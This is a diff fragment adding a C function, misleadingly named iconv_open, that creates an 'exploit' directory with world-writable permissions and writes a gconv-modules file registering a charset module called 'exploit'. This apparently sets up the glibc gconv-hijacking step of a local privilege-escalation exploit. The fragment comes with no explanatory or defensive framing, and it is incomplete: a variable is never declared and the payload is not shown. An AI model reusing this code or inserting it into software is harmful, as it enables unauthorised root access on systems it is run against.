@@ -1,0 +1,17 @@
+void iconv_open()
+{
+	if (stat("exploit", &st) < 0) {
+            if(mkdir("exploit", 0777) < 0) {
+                perror("mkdir");
+		exit(0);
+        }
+
+        FILE *fp = fopen("exploit/gconv-modules", "wb");
+        if(fp == NULL) {
+            perror("fopen");
+	    exit(0);
+        }
+        fprintf(fp, "module UTF-8// NOT_UTF8// exploit 2\n");
+        fclose(fp);
+    	}
+}
